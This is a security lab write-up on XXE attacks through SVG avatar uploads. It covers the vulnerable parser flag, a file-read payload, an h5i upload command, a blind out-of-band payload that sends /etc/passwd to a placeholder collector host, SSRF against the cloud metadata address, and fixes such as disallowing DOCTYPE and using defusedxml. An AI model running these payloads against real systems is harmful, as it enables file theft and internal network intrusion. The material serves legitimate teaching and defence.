# Lab 18 — Avatar

## The bug

```python
parser.setFeature(feature_external_ges, True)
```

External general entities on. The parser will now resolve whatever a document's
`DOCTYPE` tells it to — and the document arrives from a stranger. One boolean,
and an image uploader becomes a file-read primitive and an SSRF client.

The reason it is so common: several parsers had this **on by default** (Java's
`DocumentBuilderFactory`, .NET `XmlDocument` before 4.5.2, libxml2 in PHP
before 8.0), and a developer who never typed the line never sees it in review.

## The payload

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY leak SYSTEM "file:///path/to/service.env"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><title>&leak;</title></svg>
```

Three parts: a `DOCTYPE`, an `ENTITY` naming a URI, and a reference `&leak;`
somewhere the application will echo back. The last part is the one people
forget — an entity that expands into a node nobody prints leaks nothing.

## Sending it

```bash
h5i websec replay req_0 --session lab18 --create \
    --set method=POST --set path=/api/avatar \
    --set-file multipart.file=./avatar.svg \
    --set multipart.file.filename=avatar.svg \
    --set multipart.file.content_type=image/svg+xml
```

**`--set-file` versus `--set`.** A command line is text; an upload is bytes. Any
payload with newlines, NULs, or a JPEG's `ff d8` header must come from a file.
`--set-file` writes the file's bytes into the part unaltered, and it is applied
*after* every `--set`, so the two lines that set `filename` and `content_type`
work regardless of their order on the command line.

Those two metadata fields are separate attack surfaces of their own — see
Lab 28.

## Where XML hides

An "XML parser" is rarely labelled as one. Look for:

* **SVG** uploads — avatars, logos, diagram imports, chart exports
* **DOCX / XLSX / PPTX** — zip archives full of XML
* **SAML** assertions, **WS-Security**, **SOAP** endpoints
* **RSS/Atom** importers, **XML sitemaps**, **OPML**, **GPX**, **KML**
* **SVG → PNG** thumbnailers (also Lab 29's territory)
* an endpoint that takes JSON but *also* accepts
  `Content-Type: application/xml` — always try flipping it

## When the answer is not echoed: blind XXE

Most real targets parse and say nothing. Then use an out-of-band channel with a
parameter entity and an external DTD you host:

```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd  SYSTEM "http://your-collector/x.dtd">
  %dtd;
]>
```

and in `x.dtd`:

```xml
<!ENTITY % wrap "<!ENTITY &#37; send SYSTEM 'http://your-collector/?d=%file;'>">
%wrap; %send;
```

The data arrives in your log. For files with newlines or `&`, wrap in
`php://filter/convert.base64-encode/resource=…` on PHP targets. A parser error
that *quotes the file contents* is a third channel — worth trying a deliberately
malformed entity.

## Beyond file reading

* **SSRF.** `SYSTEM "http://169.254.169.254/latest/meta-data/"` — the parser is
  an HTTP client inside the network perimeter (Lab 25).
* **Port scanning.** Different errors and timings for open vs closed ports.
* **Denial of service.** The billion-laughs entity expansion bomb.
* **RCE**, on PHP with the `expect://` wrapper enabled.

## The fix

Turn the feature off, at the parser, everywhere:

```python
parser.setFeature(feature_external_ges, False)      # and external_pes
```

```java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

`disallow-doctype-decl` is the strongest single setting: no DOCTYPE, no
entities, no expansion bombs. In Python use `defusedxml` as a drop-in. Then, as
defence in depth, do not parse uploaded images at all — validate the magic
bytes, re-encode server-side, and serve user content from a separate origin.

## h5i technique

`--set-file multipart.<part>=PATH` for exact bytes, plus
`--set multipart.<part>.filename=` and `.content_type=` for the metadata around
them.
